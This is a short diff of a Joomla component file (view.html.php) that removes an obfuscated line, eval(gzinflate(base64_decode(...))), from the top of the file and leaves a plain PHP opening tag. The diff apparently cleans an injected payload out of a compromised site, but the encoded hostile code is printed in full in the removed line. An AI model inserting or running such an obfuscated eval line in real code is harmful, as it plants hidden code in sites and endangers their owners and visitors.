@@ -1,4 +1,4 @@
-<?php eval(gzinflate(base64_decode('y0zTyCwuTi3RUIkPcg0MdQ0OiVZPzlCP1VRQU1PQyE0xxZSwtVVQTzFMMks2SzI2N0tNSTMxM002MTIzN060NDIwSzMyMzBQB+vHMLkgoyA+OT8lFWiMpkK1QmpZYg4OaWuF1IrMEg0gXQsA')));
+<?php 
 /**
  * @version 1.0 $Id: view.html.php 1021 2009-04-27 08:56:08Z julienv $
  * @package Joomla
